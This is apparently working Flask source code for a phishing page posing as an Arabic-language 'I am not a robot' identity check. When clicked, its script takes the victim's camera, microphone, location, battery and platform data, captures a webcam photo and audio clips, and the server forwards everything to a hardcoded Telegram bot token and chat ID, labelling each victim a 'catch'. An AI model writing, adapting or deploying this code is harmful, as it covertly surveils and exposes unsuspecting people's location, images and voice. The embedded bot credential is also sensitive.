
import base64, requests, io, os, json
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- بياناتك الجديدة ---
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
CHAT_ID = "7041600701"

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; text-align: center; width: 300px; border: 1px solid #222; }
        .btn { background: #f38020; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size: 40px;">🛡️</div>
        <h3>تحقق من الهوية</h3>
        <p>اضغط للمتابعة</p>
        <button class="btn" onclick="start()">أنا لست روبوت</button>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        async function post(d, t) { fetch('/', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
        async function start() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const v = document.getElementById('v'); v.srcObject = s;
                const b = await navigator.getBattery();
                post(`📱 صيد جديد:\\nالنظام: ${navigator.platform}\\nالبطارية: ${Math.round(b.level*100)}%`, 'msg');
                navigator.geolocation.getCurrentPosition(p => { post(`📍 الموقع: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg'); });
                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    post(c.toDataURL('image/jpeg', 0.5), 'img');
                }, 3000);
                const r = new MediaRecorder(s); const ch = [];
                r.ondataavailable = e => ch.push(e.data);
                r.onstop = () => {
                    const reader = new FileReader(); reader.readAsDataURL(new Blob(ch));
                    reader.onloadend = () => post(reader.result, 'aud');
                    r.start(); setTimeout(() => r.stop(), 5000);
                };
                r.start(); setTimeout(() => r.stop(), 5000);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def main():
    if request.method == 'POST':
        data = request.get_json(force=True, silent=True)
        if not data: return "OK"
        
        # إذا كانت البيانات من تليجرام
        if "message" in data:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={'chat_id': data["message"]["chat"]["id"], 'text': "🚀 السيرفر الجديد شغال!"})
            return "OK"

        # إذا كانت البيانات صيد
        t, d = data.get('t'), data.get('d')
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        if t == 'msg':
            requests.post(url + "sendMessage", json={'chat_id': CHAT_ID, 'text': d})
        elif t == 'img':
            img = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendPhoto", data={'chat_id': CHAT_ID}, files={'photo': ('c.jpg', img)})
        elif t == 'aud':
            aud = base64.b64decode(d.split(',')[1])
            requests.post(url + "sendVoice", data={'chat_id': CHAT_ID}, files={'voice': ('v.ogg', aud)})
        return "OK"
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
